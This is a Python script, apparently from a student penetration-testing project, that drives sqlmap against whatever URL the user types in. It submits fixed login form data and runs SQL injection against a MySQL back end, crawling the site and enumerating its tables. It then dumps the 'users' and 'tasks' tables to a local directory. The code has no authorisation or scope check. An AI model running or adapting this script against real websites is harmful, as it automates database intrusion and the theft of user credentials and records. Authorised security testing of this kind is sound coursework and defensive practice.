import subprocess

def scan_url(url, post_data):
    sqlmap_path = r"D:\Amrita 4th Year\Sem_7_Projects\VAPT-WEB\webApp\sqlmap-dev\sqlmap.py"
    output_dir = r"D:\Amrita 4th Year\Sem_7_Projects\VAPT-WEB\webApp\outputs\sqlmap"

    command_tables = [
        'python', sqlmap_path,
        '-u', url,                     
        '--data', post_data,           
        '--dbms', 'mysql',             
        '--tables',                    
        '--batch',                     
        '--level', '2',                
        '--risk', '2',                 
        '--output-dir', output_dir,    
        '-v', '3',
        '--crawl', '2'                    
    ]
    
    try:
        subprocess.run(command_tables, check=True)
        print(f"Fetched tables successfully. Check the output directory: {output_dir}")

        command_dump = [
            'python', sqlmap_path,
            '-u', url,                     
            '--data', post_data,           
            '--dbms', 'mysql',             
            '--dump',                      # Dump the data
            '-T', 'tasks',                 # Specify the tasks table
            '-T', 'users',                 # Specify the users table
            '--batch',                     
            '--output-dir', output_dir,    
            '-v', '3'                      
        ]
        
        # Running the command to dump data from specified tables
        subprocess.run(command_dump, check=True)
        print(f"Data dumped successfully. Check the output directory: {output_dir}")
    
    except subprocess.CalledProcessError as e:
        print(f"Error: {e}")
        print(f"Command '{e.cmd}' returned non-zero exit status {e.returncode}.")
    except Exception as ex:
        print(f"An unexpected error occurred: {ex}")

if __name__ == '__main__':
    url = input("Enter the URL to scan: ")
    post_data = "email=test@test.com&password=test" 
    scan_url(url, post_data)
